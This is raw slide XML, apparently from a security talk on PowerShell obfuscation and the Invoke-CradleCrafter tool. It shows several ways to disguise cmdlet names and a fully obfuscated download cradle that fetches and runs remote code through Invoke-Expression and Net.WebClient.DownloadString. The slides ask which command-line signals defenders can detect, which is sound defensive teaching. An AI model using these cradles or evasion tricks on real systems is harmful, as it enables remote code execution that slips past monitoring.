            <a:ext cx="7547905" cy="193899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 marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Many options for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> obfuscation: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N`e`w`-`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>O`B`j`e`c`T</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-Ob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;('{1}{0}' -f </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>','New-O')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Command</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ExecutionContext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.InvokeCommand.GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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8311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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> "`N`e`T`.`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>W`e`B`C`l`i`e`N`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>")."`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>D`o`w`N`l`o`A`d`S`T`R`i`N`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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40488" y="3437122"/>
            <a:ext cx="7547905" cy="193899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 marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Many options for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> obfuscation: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N`e`w`-`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>O`B`j`e`c`T</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-Ob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;('{1}{0}' -f </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>','New-O')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GCM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GV *cut*t).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.InvokeCommand.GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000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091652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2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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N`e`w`-`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>O`B`j`e`c`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"`N`e`T`.`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>W`e`B`C`l`i`e`N`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>")."`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>D`o`w`N`l`o`A`d`S`T`R`i`N`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0" smtClean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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="38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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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08235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800" dirty="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean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 smtClean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 smtClean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 smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> has 10+ invocation options all with randomized obfuscation!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="Screen Shot 2017-01-24 at 12.26.07 AM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2636" y="2744079"/>
            <a:ext cx="7026725" cy="2077082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8159" y="1690688"/>
            <a:ext cx="5935680" cy="9184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51698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800" dirty="0" smtClean="0"/>
              <a:t>Enough With Tokens…What About Strings?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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3912079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2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Additional obfuscation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>techniques via string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>manipulation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
